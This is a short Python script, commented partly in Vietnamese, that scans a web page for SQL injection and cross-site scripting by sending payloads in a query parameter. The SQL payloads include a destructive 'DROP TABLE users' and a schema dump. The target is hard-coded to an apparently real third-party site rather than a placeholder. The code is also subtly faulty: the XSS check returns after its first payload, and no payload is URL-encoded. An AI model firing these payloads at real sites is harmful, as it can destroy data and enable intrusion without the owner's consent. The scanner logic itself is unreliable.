import requests
import re

#check sql injection
def check_sql_injection (url, parameter):
    payloads = ["' OR 1=1 --", "'OR '1'='1' --", "'; DROP TABLE users; --", "'; SELECT * FROM information_schema.tables; --"]
    vulnerable_urls = []
    for payload in payloads:
        modifited_url = f"{url}?{parameter}={payload}"
        response = requests.get(modifited_url)
        if "error" in response.text.lower() or "exception" in response.text.lower():
            vulnerable_urls.append(modifited_url)
    return vulnerable_urls

#check xss ()
def check_xss (url, parameter):
    payloads = ['<script>alert("XSS")</script>', '<img src="javascript:alert(\'XSS\');" />', '<a href="javascript:alert(\'XSS\');">XSS</a>']
    vulnerable_urls = []
    for payload in payloads:
        modifited_url = f"{url}?{parameter}={payload}"
        response = requests.get(modifited_url)
        if re.search(r'<script>alert\("XSS"\)</script>', response.text):
            vulnerable_urls.append(modifited_url)
        return vulnerable_urls
    
#main
if __name__ == "__main__":
    # target_url = 'http://example.com/page'
    target_url = 'https://gigi.plus/'   
    parameter_name = 'parameter'
    
    # Kiểm tra lỗ hổng SQL Injection
    print("Checking for SQL Injection vulnerabilities...")
    sql_injection_vulnerabilities = check_sql_injection(target_url, parameter_name)
    if sql_injection_vulnerabilities:
        print("SQL Injection vulnerabilities found:")
        for vuln_url in sql_injection_vulnerabilities:
            print(vuln_url)
    else:
        print("No SQL Injection vulnerabilities found.")

    # kiểm tra lỗ hổng owasp
    print("\nChecking for XSS vulnerabilities...")
    xss_vulnerabilities = check_xss(target_url, parameter_name)
    if xss_vulnerabilities:
        print("XSS vulnerabilities found:")
        for vuln_url in xss_vulnerabilities:
            print(vuln_url)
    else:
        print("No XSS vulnerabilities found.")